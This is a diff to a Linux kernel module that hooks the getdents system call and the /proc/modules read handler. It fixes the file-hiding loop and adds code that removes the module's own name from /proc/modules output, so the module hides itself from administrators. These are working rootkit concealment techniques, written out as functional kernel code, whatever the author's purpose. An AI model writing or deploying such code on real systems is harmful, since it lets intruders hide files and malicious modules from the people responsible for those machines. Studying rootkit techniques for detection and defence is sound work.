@@ -28,9 +28,6 @@ sys_getdents_t sys_getdents_orig = NULL;
 typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
 proc_modules_read_t proc_modules_read_orig = NULL;
 
-
-unsigned long (*arch_syscall_addr)(int nr) = NULL;
-
 asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
 	int boff;
 	struct linux_dirent* ent;
@@ -48,15 +45,32 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 			// copy forward the rest
 			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
 			ret -= ent->d_reclen;
+		} else {
+			boff += ent->d_reclen;
 		}
-		boff += ent->d_reclen;
 	}
 	return ret;
 }
 
 ssize_t proc_modules_read_new(struct file *f, char __user *buf, size_t len, loff_t *offset) {
-	printk(KERN_INFO "New proc read called\n");
-	return proc_modules_read_orig(f, buf, len, offset);
+	char* bad_line = NULL;
+	char* bad_line_end = NULL;
+	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
+	// search in the buf for MODULE_NAME, and remove that line
+	bad_line = strnstr(buf, MODULE_NAME, ret);
+	if (bad_line != NULL) {
+		// find the end of the line
+		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
+			if (*bad_line_end == '\n') {
+				bad_line_end++;
+				break;
+			}
+		}
+		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
+		ret -= (ssize_t)(bad_line_end - bad_line);
+	}
+	
+	return ret;
 }
 
 static int __init lkm_init_module(void) {
